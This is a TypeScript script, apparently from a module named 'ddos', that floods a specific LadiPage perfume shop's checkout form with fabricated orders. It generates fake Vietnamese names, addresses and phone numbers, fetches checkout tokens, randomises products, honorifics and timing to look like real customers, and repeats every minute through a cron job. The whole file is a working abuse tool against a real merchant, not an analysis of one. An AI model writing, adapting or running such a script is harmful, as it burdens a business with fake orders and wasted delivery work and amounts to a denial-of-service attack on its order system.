import { CronJob } from 'cron';

import { getCheckoutToken, sendForm1, sendForm2 } from './lib/ddos';
import { getRandomAdd } from './lib/getRandomAdd';
import { performanceNow } from './lib/performance-now';
import { randomIntFromInterval } from './lib/randomNumber';


const ladipage_id = '62185d22c113db00169769f7';
const form_config_id = '61784bb470b33200122469a1';

const LAST_NAME = ['Nguyễn', 'Lê', 'Trần', 'Phan', 'Võ', 'Hoàng', 'Đặng', 'Bùi', 'Đỗ'];
const productsCheckout = ['46765:1:899000::|Mã 01 - Coco Noir Chanel (black)|282:Giảm thêm 100.000đ:799000', '46766:1:899000::|Mã 02 - Coco Mademoiselle Edt (White)|282:Giảm thêm 100.000đ:799000', '46767:1:899000::|Mã 03 - Coco Vaporisateur Spray (Yellow)|282:Giảm thêm 100.000đ:799000', '46770:1:899000::|Mã 04 - No5 Chanel|282:Giảm thêm 100.000đ:799000', '46771:1:899000::|Mã 05 - Chanel Chance Eau Tendre|282:Giảm thêm 100.000đ:799000', '46772:1:899000::|Mã 06 - Gucci Bloom|282:Giảm thêm 100.000đ:799000', '9211:1:899000::|Mã 07 - Bleu De Chanel|282:Giảm thêm 100.000đ:799000', '46776:1:899000::|Mã 08 - Versace Eros Man EDT|282:Giảm thêm 100.000đ:799000', '46780:1:899000::|Mã 09 - Dior Sauvage|282:Giảm thêm 100.000đ:799000', '46781:1:899000::|Mã 10 - Acqua Di Gio|282:Giảm thêm 100.000đ:799000', '46784:1:899000::|Mã 11 - Allure Homme Sport|282:Giảm thêm 100.000đ:799000'];

const getDataKey = () => {
  const a = form_config_id + '|' + ladipage_id + '|' + Date.now() + '|' + performanceNow();

  return a;
};
const checkout = async (name: string, add: string, phone: string) => {
  try {
    const checkoutTokenRes = await getCheckoutToken();
    const dataKey = getDataKey();

    if (checkoutTokenRes?.data?.checkout_token) {
      const checkoutToken = checkoutTokenRes?.data?.checkout_token;

      const numberOfProduct = randomIntFromInterval(1, 2);
      const products: any[] = [];
      for (let i = 0; i < numberOfProduct; i++) {
        const ranmdomProductIndex = randomIntFromInterval(1, 11);
        products.push(productsCheckout[ranmdomProductIndex - 1]);
      }
      await sendForm1(name, add, phone, products, dataKey);
      await sendForm2(name, add, phone, products, dataKey, checkoutToken);
    }
  } catch (e) {
    console.error('checkout error', e);
  }
  console.log('checkout ok');
};

const main = async () => {
  const maxOrderCount = randomIntFromInterval(1, 3);
  const addInfo = [];
  const addData = await getRandomAdd();
  if (Array.isArray(addData?.addNameArr)) {
    addData.addNameArr.forEach((nameData: string) => {
      const _nameArr = nameData.split(' ');
      if (Array.isArray(_nameArr) && _nameArr.length === 3) {
        try {
          const name = `${LAST_NAME[randomIntFromInterval(1, 9) - 1]} ${_nameArr[1]} ${_nameArr[0]}`;
          const add = addData.addDataArr[randomIntFromInterval(1, 10) - 1];
          const preTele = ['091', '088', '096', '097', '098'];
          const telephone = `${preTele[randomIntFromInterval(1, preTele.length) - 1]}${Math.floor(Math.random() * 10000000)}`;
          addInfo.push({
            name,
            add,
            telephone
          });
        } catch (e) {
          console.log(e);
        }

      }
    });
  }

  const jobs: any = [];
  for (let i = 0; i < maxOrderCount; i++) {
    const _add = addInfo[i];
    jobs.push(new Promise(async (resolve) => {
      setTimeout(async () => {
        if (typeof _add.add === 'string' && _add.add.charAt(0) === ' ') {
          _add.add = _add.add.substring(1).slice(0, -1);
        }

        if (randomIntFromInterval(1, 5) >= 3) {
          const _namePre = ['Anh', 'anh', 'chị', 'Chị', 'Bác', 'Ông', 'bác'];
          const _nameArrSp = _add.name.split(' ');
          _add.name = `${_namePre[randomIntFromInterval(1, _namePre.length) - 1]} ${_nameArrSp[randomIntFromInterval(1, _nameArrSp.length)-1]}`;
        }

        console.log(`name: '${_add.name}' add: '${_add.add}' telephone: '${_add.telephone}'`);
        await checkout(_add.name, _add.add, _add.telephone);
        resolve(null);
      }, randomIntFromInterval(300, 500));
    }));
  }

  await Promise.all(jobs);
};
main();
const job = new CronJob('0 * * * * *', () => {
  console.log('Run checkout');
  main();
}, null, true, 'America/Los_Angeles');
job.start();
